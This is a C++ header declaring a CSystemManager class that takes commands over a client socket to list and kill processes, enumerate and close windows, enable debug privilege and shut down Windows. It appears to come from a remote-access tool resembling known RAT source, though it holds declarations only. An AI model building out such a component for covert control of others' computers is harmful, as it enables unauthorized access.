
#include "Manager.h"
class CSystemManager :
	public CManager
{
public:
	CSystemManager(CClientSocket *pClient,BOOL bHow);
	~CSystemManager();

	static bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam);
private:
	int m_iHow;
	void SendProcessList();
	LPBYTE getProcessList();
public:
	static bool DebugPrivilege(const char *PName, BOOL bEnable);
	static void ShutdownWindows(DWORD dwReason);
private:
	void KillProcess(LPBYTE lpBuffer, UINT nSize);
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
protected:
	LPBYTE getWindowsList();
	void SendWindowsList();
	void CloseWindow(LPBYTE buf);
public:
	
protected:
	void TestWindow(LPBYTE buf);
};
